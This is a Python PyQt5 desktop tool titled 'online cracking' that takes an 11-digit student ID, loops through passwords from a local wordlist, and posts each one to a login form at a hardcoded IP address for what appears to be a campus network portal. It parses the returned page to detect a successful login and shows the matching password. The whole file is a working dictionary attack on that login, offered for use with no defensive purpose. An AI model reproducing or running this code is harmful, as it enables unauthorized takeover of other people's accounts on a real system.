import sys
import requests
from bs4 import BeautifulSoup
from PyQt5.QtWidgets import (QWidget, QGridLayout, QLineEdit,
    QPushButton, QApplication)

class Example(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        grid = QGridLayout()
        self.setLayout(grid)

        names = ["学号", '', '','','',
                 '密码', '', '','','',
                '破解','','','重输','',]

        positions = [(i,j) for i in range(3) for j in range(5)]

        for position, name in zip(positions, names):
            if name == '':
                continue
            button = QPushButton(name)
            button.clicked.connect(self.on_button_clicked)
            grid.addWidget(button, *position)

        #跨行显示
        self.resultLineEdit1=QLineEdit()
        self.resultLineEdit2 = QLineEdit()
        grid.addWidget(self.resultLineEdit1, 0, 1, 1, 3)
        grid.addWidget(self.resultLineEdit2, 1, 1, 1, 3)

        self.move(300, 150)
        self.setWindowTitle('在线破解')
        self.show()

    def on_button_clicked(self):
        button = self.sender()
        text = button.text()
        if text == "破解":
            url = 'http://113.55.11.245/netdru/?q=user'
            passFile = open('F:/pwd1.txt')
            i=0
            #self.resultLineEdit2.setText("222")
            for line in passFile.readlines():
                password = line.strip('\n')
                #password = 19990213
                id = self.resultLineEdit1.text()
                if len(id)!=11:
                    self.resultLineEdit2.setText("干啥呢，重输")
                    self.resultLineEdit1.setText("干啥呢，重输")
                else:
                    params = {"edit[name]:": id, "edit[pass]:": password, "op:": '登陆'}
                    #print(id,password)
                    html = requests.post(url, data=params)
                    soup = BeautifulSoup(html.text, 'lxml')
                    p = soup.find_all(class_='block block-netdru_student')
                    #print(id, password)
                    if p == []:
                        i = i + 1
                        print("wrong password:")
                        print(password)
                        #print("failed")
                        continue
                    else:
                        #print("succeed")
                        #print(password)
                        self.resultLineEdit2.setText(str(password))
                        break
        elif text in "重输":
                self.resultLineEdit1.clear()
                self.resultLineEdit2.clear()
        else:
            self.resultLineEdit2.setText("别乱摸，重输")
            self.resultLineEdit1.setText("别乱摸，重输")


if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = Example()
    ex.show()
    sys.exit(app.exec_())